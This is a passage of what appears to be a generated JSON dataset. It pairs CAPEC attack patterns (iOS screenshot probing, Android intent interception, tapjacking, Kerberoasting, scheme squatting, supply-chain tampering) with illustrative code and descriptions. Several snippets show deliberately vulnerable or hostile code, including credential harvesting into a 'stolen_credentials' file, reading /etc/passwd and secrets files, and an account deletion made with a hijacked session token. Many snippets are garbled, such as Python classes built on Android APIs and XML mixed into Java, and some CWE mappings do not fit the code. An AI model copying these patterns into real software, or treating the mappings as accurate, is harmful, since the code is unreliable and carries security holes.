        "description": "This Python code snippet demonstrates a vulnerable function that searches for specific sensitive files ('config.txt', 'secrets.txt', 'access_control_list.txt') within a user-specified directory. The function 'discover_files' uses 'os.walk' to traverse the directory and its subdirectories, looking for these files. If found, it reads and prints their contents. This code embodies the 'File Discovery' CAPEC by probing for key files that may contain sensitive information. The vulnerabilities include CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it prints sensitive file contents, CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere) as it may expose access control lists, and CWE-73 (External Control of File Name or Path) as it allows user input to control the directory path being searched."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import os\nimport shutil\n\n# Simulate sensitive information\nsensitive_info = 'User Password: 12345'\n\n# Path where iOS might store temporary screenshots\nscreenshot_path = '/path/to/ios/screenshots/'\n\n# Function to save sensitive information to a file\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate taking a screenshot and saving it to the temporary path\nshutil.copy('sensitive_info.txt', os.path.join(screenshot_path, 'screenshot.png'))\n\n# Function to probe screenshots for sensitive information\nfor root, dirs, files in os.walk(screenshot_path):\n    for file in files:\n        if file.endswith('.png'):\n            with open(os.path.join(root, file), 'r') as screenshot:\n                data = screenshot.read()\n                if 'User Password' in data:\n                    print('Sensitive information found in screenshot:', file)",
        "description": "This Python code snippet simulates the CAPEC 'Probe iOS Screenshots' by creating a temporary screenshot that contains sensitive information and then probing the screenshot directory to find and read this sensitive information. The code first writes sensitive information to a file, simulates taking a screenshot by copying this file to a designated screenshot directory, and then iterates through the directory to find and read the screenshot file. If sensitive information is found in the screenshot, it prints a message indicating the presence of sensitive data. This demonstrates how an adversary could exploit temporary screenshots to access sensitive information, aligning with the described CAPEC and related CWEs."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-927: Using implicit intent for sensitive communication\n        String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n        Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        // CWE-925: Improper verification of intent by Broadcast Receiver\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}\n\n// CWE-926: Improper export of Android application components\n// This component is exported without proper restrictions\n<receiver android:name=\".VulnerableReceiver\"\n    android:exported=\"true\">\n    <intent-filter>\n        <action android:name=\"com.example.SENSITIVE_ACTION\" />\n    </intent-filter>\n</receiver>",
        "description": "This code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly handles intents, embodying the main idea of the CAPEC 'Android Intent Intercept'. The BroadcastReceiver uses an implicit intent to receive sensitive data (CWE-927) and does not verify the source of the intent (CWE-925). Additionally, the component is exported without proper restrictions (CWE-926), making it accessible to any application. This setup allows a malicious application to intercept, modify, or block the intent, leading to potential information disclosure, denial of service, or data injection."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\nclass MyWebViewClient(WebViewClient):\n    def onPageFinished(self, view, url):\n        view.loadUrl(\"javascript:window.AndroidInterface.processHTML(document.getElementsByTagName('html')[0].innerHTML);\")\n\nclass MainActivity:\n    def __init__(self):\n        self.webview = WebView()\n        self.webview.getSettings().setJavaScriptEnabled(True)\n        self.webview.addJavascriptInterface(self, \"AndroidInterface\")\n        self.webview.setWebViewClient(MyWebViewClient())\n        self.webview.loadUrl(\"http://example.com\")\n\n    @JavascriptInterface\n    def processHTML(self, html):\n        # Process the HTML content\n        print(html)\n\n# Simulate the MainActivity\nmain_activity = MainActivity()",
        "description": "This Python code snippet simulates an Android application using a WebView component to load a web page. The WebView is configured to enable JavaScript and injects a JavaScript interface named 'AndroidInterface'. When the page finishes loading, it executes JavaScript to retrieve the HTML content of the page and passes it to the 'processHTML' method. This setup embodies the CAPEC 'WebView Injection' by allowing an adversary to inject code into the web page context, manipulate the DOM, and potentially expose sensitive information. The code also highlights CWE-749 (Exposed Dangerous Method or Function) by exposing the 'processHTML' method to JavaScript without proper restrictions, CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the loaded URL, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side code to handle security-sensitive operations."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.widget.EditText;\nimport android.widget.Button;\nimport android.view.View;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        Button button = findViewById(R.id.button);\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Using implicit intent to launch another activity\n                Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n                startActivity(intent);\n            }\n        });\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\nimport android.widget.EditText;\nimport android.widget.Button;\nimport android.view.View;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimicking the trusted activity's UI\n        EditText sensitiveData = findViewById(R.id.sensitiveData);\n        Button submitButton = findViewById(R.id.submitButton);\n        submitButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Capture sensitive data\n                String data = sensitiveData.getText().toString();\n                // Send data to attacker\n                sendToAttacker(data);\n            }\n        });\n    }\n\n    private void sendToAttacker(String data) {\n        // Code to send data to attacker\n    }\n}",
        "description": "The provided code snippet demonstrates a vulnerable Android application where an implicit intent is used to launch a trusted activity. However, an adversary can intercept this intent and launch a counterfeit activity (MaliciousActivity) instead. The malicious activity mimics the trusted activity's user interface and prompts the user to enter sensitive data, which is then captured and sent to the attacker. This example highlights the risks associated with using implicit intents for sensitive communications and the importance of properly verifying the source and destination of intents."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.Intent;\nimport android.content.Context;\nimport android.content.BroadcastReceiver;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n}\n\n// CWE-926: Improper Export of Android Application Components\n<receiver android:name=\".VulnerableReceiver\" android:exported=\"true\">\n    <intent-filter>\n        <action android:name=\"com.example.TRUSTED_ACTION\" />\n    </intent-filter>\n</receiver>",
        "description": "This code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly verifies intents and is improperly exported. The BroadcastReceiver listens for intents with the action 'com.example.TRUSTED_ACTION'. However, it does not verify the source of the intent, allowing any application to send an intent with this action. If the intent contains sensitive data, it logs this data, leading to potential information disclosure. Additionally, the BroadcastReceiver is exported without proper restrictions, making it accessible to any application, which can exploit this vulnerability to send malicious intents."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView myWebView = (WebView) findViewById(R.id.webview);\n        myWebView.getSettings().setJavaScriptEnabled(true);\n        myWebView.addJavascriptInterface(new WebAppInterface(this), \"Android\");\n        myWebView.loadUrl(\"file:///android_asset/index.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application that uses WebView and the addJavascriptInterface API. The WebView is configured to enable JavaScript and expose a Java interface to JavaScript running in the WebView. The WebAppInterface class contains a method showToast that can be called from JavaScript. This setup can be exploited by a malicious web page loaded in the WebView to access application-specific functionality, leading to potential security risks such as improper access control (CWE-284), exposed dangerous methods (CWE-749), and cross-site scripting (CWE-79)."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport sys\n\n# CWE-506: Embedded Malicious Code\n# CWE-285: Improper Authorization\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\ndef impersonate_task(user):\n    # CWE-285: Improper Authorization\n    if user != 'admin':\n        print('Access Denied')\n        return\n\n    # CWE-520: Use of Impersonation\n    os.system('sudo -u admin whoami')\n\n    # CWE-506: Embedded Malicious Code\n    with open('/etc/passwd', 'r') as f:\n        sensitive_data = f.read()\n        print(sensitive_data)\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print('Usage: python script.py <user>')\n        sys.exit(1)\n\n    user = sys.argv[1]\n    impersonate_task(user)\n",
        "description": "This Python code snippet demonstrates a task impersonation attack. The `impersonate_task` function checks if the user is 'admin' (CWE-285: Improper Authorization). If the user is 'admin', it uses the `os.system` call to impersonate the admin user (CWE-520: .NET Misconfiguration: Use of Impersonation). The function then reads and prints sensitive data from '/etc/passwd' (CWE-506: Embedded Malicious Code). This code represents the main idea of CAPEC-233: Task Impersonation, where an adversary impersonates a task to steal sensitive information or leverage user privileges."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import webbrowser\n\n# Malicious application registering a custom URL scheme\nclass MaliciousApp:\n    def __init__(self):\n        self.scheme = 'targetapp://'\n\n    def handle_url(self, url):\n        if url.startswith(self.scheme):\n            self.display_fake_login()\n\n    def display_fake_login(self):\n        # Mimicking the target application's login screen\n        print('Welcome to TargetApp! Please log in.')\n        username = input('Username: ')\n        password = input('Password: ')\n        self.store_credentials(username, password)\n\n    def store_credentials(self, username, password):\n        # Storing credentials in a non-secure way (for demonstration purposes)\n        with open('stolen_credentials.txt', 'a') as f:\n            f.write(f'Username: {username}, Password: {password}\\n')\n\n# Simulating a URL being opened that the malicious app handles\nmalicious_app = MaliciousApp()\nmalicious_app.handle_url('targetapp://login')",
        "description": "This Python code snippet demonstrates a 'Scheme Squatting' attack. The malicious application registers a custom URL scheme ('targetapp://') intended for a target application that is not installed. When a URL with this scheme is opened, the malicious application handles it and displays a fake login screen mimicking the target application. The user is tricked into entering their credentials, which are then stored by the malicious application. This code embodies the main idea of the CAPEC by showing how an attacker can exploit custom URL schemes to phish for sensitive information. The related CWEs are represented by the embedded malicious code (CWE-506), improper authorization in the custom URL scheme handler (CWE-939), and the generation of an error message containing sensitive information (CWE-209)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\n\nclass MaliciousApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.title('Innocent App')\n        self.root.geometry('300x200')\n\n        # Create a transparent overlay\n        self.overlay = tk.Toplevel(root)\n        self.overlay.geometry('300x200')\n        self.overlay.attributes('-alpha', 0.0)  # Fully transparent\n        self.overlay.attributes('-topmost', True)\n\n        # Add a malicious button on the overlay\n        self.malicious_button = tk.Button(self.overlay, text='Click Me', command=self.malicious_action)\n        self.malicious_button.place(x=100, y=100)\n\n        # Add a legitimate button on the main app\n        self.legit_button = tk.Button(root, text='Legit Button', command=self.legit_action)\n        self.legit_button.place(x=100, y=100)\n\n    def malicious_action(self):\n        print('Malicious action executed!')\n\n    def legit_action(self):\n        print('Legitimate action executed!')\n\nif __name__ == '__main__':\n    root = tk.Tk()\n    app = MaliciousApp(root)\n    root.mainloop()",
        "description": "This Python code snippet demonstrates a basic example of a tapjacking attack using the Tkinter library. The main application window ('Innocent App') has a legitimate button. However, a transparent overlay window is created on top of the main window, containing a malicious button at the same location as the legitimate button. When the user attempts to click the legitimate button, they unknowingly click the malicious button instead, triggering the 'malicious_action' function. This example embodies the concept of tapjacking by misleading the user into interacting with a hidden malicious interface. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the overlay to capture clicks intended for the underlying application."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import os\n\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\n# CWE-1263: Improper Physical Access Control\n\n# Sensitive information stored in a file without proper access control\nsensitive_data = 'This is very sensitive information.'\nfile_path = '/tmp/sensitive_data.txt'\n\n# Writing sensitive data to a file in a world-readable location\nwith open(file_path, 'w') as file:\n    file.write(sensitive_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Exposing system information\nsystem_info = os.uname()\nprint(f'System Information: {system_info}')\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# No protection against physical side channels (e.g., power analysis, EM emissions)\n# This is a placeholder to indicate lack of such protections\nprint('No physical side channel protections in place.')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to physical theft and improper handling of sensitive information. The code stores sensitive data in a file located in a world-readable directory (`/tmp`), which lacks proper access control (CWE-922, CWE-921). It also prints system information, exposing it to unauthorized users (CWE-497). Additionally, the code highlights the absence of protections against physical side channels (CWE-1300). The overall scenario represents a situation where an adversary with physical access to the system can easily retrieve sensitive information due to improper physical access control (CWE-1263)."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import getpass\n\n# Simulate a login function that exposes sensitive information\n\ndef login():\n    username = input('Enter your username: ')\n    password = getpass.getpass('Enter your password: ')\n    \n    # Simulate a vulnerability by printing sensitive information\n    print(f'Logging in with username: {username} and password: {password}')\n\nif __name__ == '__main__':\n    login()",
        "description": "This Python code snippet simulates a login function that is vulnerable to shoulder surfing attacks. The `getpass` module is used to securely input the password without displaying it on the screen. However, the code then prints the username and password in cleartext, exposing sensitive information to anyone who can see the screen. This embodies the main idea of the CAPEC by demonstrating how sensitive information can be exposed to unauthorized actors through shoulder surfing. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-359) and the cleartext transmission of sensitive data (CWE-319)."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\n# Function to request a Kerberos ticket for a service account\n# This is a simplified example and should not be used in production\n\ndef request_kerberos_ticket(service_account):\n    # Requesting a Kerberos ticket using a single-factor authentication (password)\n    command = f'kinit {service_account}'\n    os.system(command)\n\n# Function to extract and save the Kerberos ticket to disk\n# This is a simplified example and should not be used in production\n\ndef extract_ticket_to_disk():\n    # Extracting the ticket using a system command\n    command = 'klist -k'  # This command lists the Kerberos tickets\n    tickets = subprocess.check_output(command, shell=True)\n    with open('ticket.txt', 'wb') as f:\n        f.write(tickets)\n\n# Function to simulate brute-forcing the ticket\n# This is a simplified example and should not be used in production\n\ndef brute_force_ticket(ticket_file):\n    with open(ticket_file, 'rb') as f:\n        ticket_data = f.read()\n    # Simulate brute-forcing by iterating over possible passwords (not implemented)\n    # In a real scenario, this would involve a more complex brute-force attack\n    print('Brute-forcing the ticket...')\n\n# Main function to demonstrate the Kerberoasting attack\n\ndef main():\n    service_account = 'service_account@domain.com'\n    request_kerberos_ticket(service_account)\n    extract_ticket_to_disk()\n    brute_force_ticket('ticket.txt')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simplified version of a Kerberoasting attack. The code requests a Kerberos ticket for a service account using single-factor authentication (CWE-308) and stores the ticket on disk (CWE-522). It then simulates the extraction of the ticket and a brute-force attack to crack the ticket's hashed credentials. The code highlights vulnerabilities such as insufficiently protected credentials, weak password requirements, and the use of single-factor authentication, which are common weaknesses associated with Kerberoasting attacks."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\n# Malicious application leveraging a trusted user's session\nclass MaliciousApp:\n    def __init__(self, session_token):\n        self.session_token = session_token\n        self.saas_url = 'https://example-saas.com/api/'\n\n    def perform_malicious_action(self):\n        headers = {\n            'Authorization': f'Bearer {self.session_token}'\n        }\n        # Exploiting the trusted session to perform unauthorized actions\n        response = requests.post(self.saas_url + 'delete_account', headers=headers, json={'user_id': 'victim_user_id'})\n        if response.status_code == 200:\n            print('Malicious action performed successfully')\n        else:\n            print('Failed to perform malicious action')\n\n# Example usage\n# Assume the session_token is obtained from a trusted user's session\nsession_token = 'trusted_user_session_token'\nmalicious_app = MaliciousApp(session_token)\nmalicious_app.perform_malicious_action()",
        "description": "This Python code snippet demonstrates a malicious application that leverages a trusted user's session token to perform unauthorized actions against a SaaS application. The `MaliciousApp` class takes a session token (representing a trusted user's authenticated session) and uses it to send a malicious request to the SaaS application's API. The request attempts to delete a user account, exploiting the implicit trust the SaaS application places on the authenticated session. This example embodies the CAPEC 'SaaS User Request Forgery' by showing how an attacker can piggy-back on a trusted user's session to perform actions at the user's privilege level. The code also highlights related CWEs such as Origin Validation Error (CWE-346) and Improper Authorization (CWE-285) by not properly verifying the source of the request and failing to correctly perform authorization checks."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport base64\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\nDEBUG = True\nSECRET_KEY = 'super_secret_key'\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Function to simulate file upload\ndef upload_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n    with open(file_path, 'rb') as f:\n        file_data = f.read()\n    # Simulate processing of the uploaded file\n    process_file(file_data)\n\n# Function to simulate processing of the uploaded file\ndef process_file(data):\n    # Malicious code embedded to exfiltrate sensitive information\n    exfiltrate_data(data)\n\n# Function to simulate exfiltration of data\ndef exfiltrate_data(data):\n    encoded_data = base64.b64encode(data).decode('utf-8')\n    # Simulate sending data to an unauthorized actor\n    print(f'Exfiltrated Data: {encoded_data}')\n\n# Simulate an attacker uploading a malicious file\nif DEBUG:\n    upload_file('malicious_payload.bin')",
        "description": "This Python code snippet demonstrates a scenario where an attacker infiltrates a software development environment by uploading a malicious file. The code includes several vulnerabilities: \n1. CWE-215: Sensitive information (SECRET_KEY) is included in debugging code, which is enabled by the DEBUG flag.\n2. CWE-434: The upload_file function allows unrestricted upload of files, including potentially dangerous types.\n3. CWE-506: The process_file function contains embedded malicious code that exfiltrates data.\n4. CWE-497 and CWE-200: The exfiltrate_data function exposes sensitive system information to an unauthorized actor by encoding and printing the data.\n\nThe main idea of the CAPEC is represented by the infiltration of the development environment through file upload, processing the file to embed malicious code, and exfiltrating sensitive information, which could lead to future compromises in the supply chain."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import third_party_component\n\nclass Device:\n    def __init__(self):\n        # Dependency on a third-party component that may be vulnerable\n        self.component = third_party_component.load_component()\n        if not self.component.is_trustworthy():\n            raise Exception('Untrustworthy component detected!')\n\n    def perform_operation(self):\n        # Simulate operation that relies on the third-party component\n        try:\n            result = self.component.execute()\n            return result\n        except Exception as e:\n            print(f'Operation failed: {e}')\n\n# Simulate the substitution of a malicious component during baselining\nclass MaliciousComponent:\n    def is_trustworthy(self):\n        return False\n\n    def execute(self):\n        # Malicious behavior\n        return 'Malicious operation executed'\n\n# During baselining, the malicious component is substituted\nthird_party_component.load_component = lambda: MaliciousComponent()\n\ndevice = Device()\nprint(device.perform_operation())",
        "description": "This Python code snippet simulates the scenario described in the CAPEC 'Hardware Component Substitution During Baselining'. The 'Device' class depends on a third-party component, which is loaded during initialization. The code checks if the component is trustworthy and raises an exception if it is not. The 'perform_operation' method simulates an operation that relies on this component. To represent the substitution of a malicious component during baselining, a 'MaliciousComponent' class is defined and substituted for the original component. This demonstrates how an adversary could replace a legitimate component with a malicious one, leading to unintended and potentially harmful behavior in the final product. The related CWEs are reflected in the dependency on a potentially vulnerable third-party component and the reliance on its trustworthiness."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1263: Improper Physical Access Control\n# CWE-1059: Insufficient Technical Documentation\n# CWE-695: Use of Low-Level Functionality\n# CWE-222: Truncation of Security-relevant Information\n\n# Simulated function to read and alter documentation\n# This function represents an attacker altering documentation to circumvent dial-down functionality\n\ndef alter_documentation(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError(\"Documentation file not found.\")\n\n    with open(file_path, 'r') as file:\n        content = file.read()\n\n    # Simulate altering the documentation to circumvent restrictions\n    altered_content = content.replace('restricted_technology', 'allowed_technology')\n\n    with open(file_path, 'w') as file:\n        file.write(altered_content)\n\n    print(\"Documentation altered successfully.\")\n\n# Example usage\ntry:\n    alter_documentation('path/to/documentation.txt')\nexcept Exception as e:\n    print(f\"Error: {e}\")",
        "description": "This Python code snippet simulates an attacker altering a manufacturer's documentation to circumvent dial-down functionality requirements. The function `alter_documentation` reads the content of a documentation file, replaces instances of 'restricted_technology' with 'allowed_technology', and writes the altered content back to the file. This represents the attack described in the CAPEC, where an attacker changes the interpretation of implementation and manufacturing techniques to gain access to advanced technology that should be restricted. The code also highlights related CWEs by demonstrating improper physical access control (CWE-1263), exposure of sensitive information (CWE-200), insufficient technical documentation (CWE-1059), use of low-level functionality (CWE-695), and truncation of security-relevant information (CWE-222)."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "class SystemDocumentation:\n    def __init__(self, system_capabilities):\n        self.system_capabilities = system_capabilities\n        self.documentation = {}\n\n    def add_documentation(self, component, description):\n        self.documentation[component] = description\n\n    def alter_documentation(self, component, new_description):\n        if component in self.documentation:\n            self.documentation[component] = new_description\n        else:\n            raise ValueError('Component not found in documentation')\n\n    def get_documentation(self, component):\n        return self.documentation.get(component, 'No documentation available')\n\n# Example usage\nsystem_doc = SystemDocumentation(system_capabilities=['auth', 'data_processing'])\nsystem_doc.add_documentation('auth', 'Handles user authentication securely')\nsystem_doc.add_documentation('data_processing', 'Processes user data efficiently')\n\n# Attacker alters the documentation to introduce a flaw\nsystem_doc.alter_documentation('auth', 'Handles user authentication with basic checks')\n\n# System engineer retrieves the altered documentation\nprint(system_doc.get_documentation('auth'))",
        "description": "This Python code snippet represents a simplified model of how an attacker could alter system documentation to introduce flaws, as described in the CAPEC. The `SystemDocumentation` class allows adding, altering, and retrieving documentation for system components. The `alter_documentation` method can be misused by an attacker to change the description of a component, leading to potential under-performance or security issues. For instance, the attacker changes the 'auth' component's description to indicate weaker security measures. This alteration can mislead engineers and result in a system that is less secure or effective, embodying the main idea of the CAPEC. The related CWEs are reflected in the insufficient and potentially misleading documentation handling."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemComponent:\n    def __init__(self, config):\n        # Insufficient Technical Documentation (CWE-1059)\n        # Missing Documentation for Design (CWE-1053)\n        self.config = config\n        self.state = None\n\n    def initialize(self):\n        # Incorrect Provision of Specified Functionality (CWE-684)\n        if 'init_state' in self.config:\n            self.state = self.config['init_state']\n        else:\n            self.state = 'default'\n\n    def execute(self, command):\n        # Improper Following of Specification by Caller (CWE-573)\n        if command == 'start':\n            self.state = 'running'\n        elif command == 'stop':\n            self.state = 'stopped'\n        else:\n            raise ValueError('Unknown command')\n\n    def update_config(self, key, value):\n        # Improper Control of Dynamically-Managed Code Resources (CWE-913)\n        self.config[key] = value\n\n# Example of malicious alteration in documentation leading to incorrect usage\n# Original documentation might have specified 'start' and 'stop' commands\n# Malicious alteration changes it to 'begin' and 'end'\n\ncomponent = SystemComponent({'init_state': 'idle'})\ncomponent.initialize()\ntry:\n    component.execute('begin')  # This will raise an error due to incorrect command\nexcept ValueError as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet represents a system component that can be initialized and executed based on a configuration. The code embodies the main idea of the CAPEC by demonstrating how insufficient or altered documentation can lead to errors in system design and usage. The class `SystemComponent` has methods that suffer from various weaknesses: insufficient technical documentation (CWE-1059), missing design documentation (CWE-1053), incorrect functionality provision (CWE-684), improper following of specifications (CWE-573), and improper control of dynamically-managed code resources (CWE-913). The example at the end shows how a malicious alteration in the documentation (changing 'start' and 'stop' commands to 'begin' and 'end') can cause the system to raise errors, illustrating the potential impact of such an attack."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, id, trusted=True):\n        self.id = id\n        self.trusted = trusted\n        self.malicious_code = None\n        if not trusted:\n            self.malicious_code = self.embed_malicious_code()\n\n    def embed_malicious_code(self):\n        return 'malicious_function()'\n\n    def execute(self):\n        if self.malicious_code:\n            exec(self.malicious_code)\n        else:\n            print(f'Component {self.id} is operating normally.')\n\n# Simulate product assembly with a mix of trusted and counterfeit components\ncomponents = [HardwareComponent(i, trusted=random.choice([True, False])) for i in range(10)]\n\nfor component in components:\n    component.execute()",
        "description": "This Python code snippet simulates the insertion of counterfeit hardware components during product assembly, embodying the main idea of the CAPEC. The `HardwareComponent` class represents a hardware component with an `id` and a `trusted` attribute. If the component is not trusted, it embeds malicious code. The `execute` method runs the component's code, executing the malicious code if present. The simulation creates a mix of trusted and counterfeit components and executes them, demonstrating how counterfeit components can introduce malicious behavior into a system. This snippet highlights vulnerabilities such as embedded malicious code (CWE-506), reliance on untrustworthy components (CWE-1357), and the inclusion of undocumented features (CWE-1242)."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, register_defaults=None):\n        # CWE-1221: Incorrect Register Defaults or Module Parameters\n        self.register_defaults = register_defaults or {'reg1': 0x00, 'reg2': 0x00}\n        self.lock_bit = False  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n    def set_register(self, reg, value):\n        if self.lock_bit:\n            raise PermissionError(\"Register modification is locked.\")\n        self.register_defaults[reg] = value\n\n    def lock_registers(self):\n        self.lock_bit = True\n\n    def unlock_registers(self):\n        # CWE-1231: Improper Prevention of Lock Bit Modification\n        self.lock_bit = False\n\n# CWE-1059: Insufficient Technical Documentation\n# Documentation is missing for the usage, structure, and configuration of this class.\n\n# CWE-657: Violation of Secure Design Principles\n# The design allows for insecure modification of registers and lock bit.\n\n# CWE-1296: Incorrect Chaining or Granularity of Debug Components\n# Debugging components are not properly chained or granular.\n\n# Example usage\ncomponent = HardwareComponent()\ncomponent.set_register('reg1', 0xFF)  # Set register to a new value\ncomponent.lock_registers()  # Lock the registers\ncomponent.unlock_registers()  # Unlock the registers, which should not be allowed",
        "description": "This Python code snippet represents a simplified model of a hardware component with registers and a lock bit mechanism. The class `HardwareComponent` initializes with default register values and includes methods to set register values, lock, and unlock the registers. The code embodies the main idea of the CAPEC by demonstrating how an attacker could exploit insufficient technical documentation (CWE-1059), incorrect register defaults (CWE-1221), violation of secure design principles (CWE-657), improper prevention of lock bit modification (CWE-1231), and incorrect chaining or granularity of debug components (CWE-1296). The lack of proper documentation and insecure design allows for potential vulnerabilities, such as unauthorized modification of register values and lock bit states."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, name, is_trustworthy=True):\n        self.name = name\n        self.is_trustworthy = is_trustworthy\n        self.is_updateable = True\n        self.has_malicious_code = False\n\n    def inject_malicious_code(self):\n        if not self.is_trustworthy:\n            self.has_malicious_code = True\n\n    def degrade_redundancy(self):\n        if not self.is_trustworthy:\n            return 'Redundancy degraded'\n        return 'Redundancy intact'\n\n# Simulate supply chain attack\ncomponents = [\n    HardwareComponent('ComponentA'),\n    HardwareComponent('ComponentB', is_trustworthy=False),  # Malicious component\n    HardwareComponent('ComponentC')\n]\n\n# Inject malicious code and degrade redundancy\nfor component in components:\n    component.inject_malicious_code()\n    print(f'{component.name} malicious code status: {component.has_malicious_code}')\n    print(f'{component.name} redundancy status: {component.degrade_redundancy()}')\n\n# Simulate reliance on non-updateable component\nnon_updateable_component = HardwareComponent('ComponentD')\nnon_updateable_component.is_updateable = False\nprint(f'{non_updateable_component.name} updateable status: {non_updateable_component.is_updateable}')",
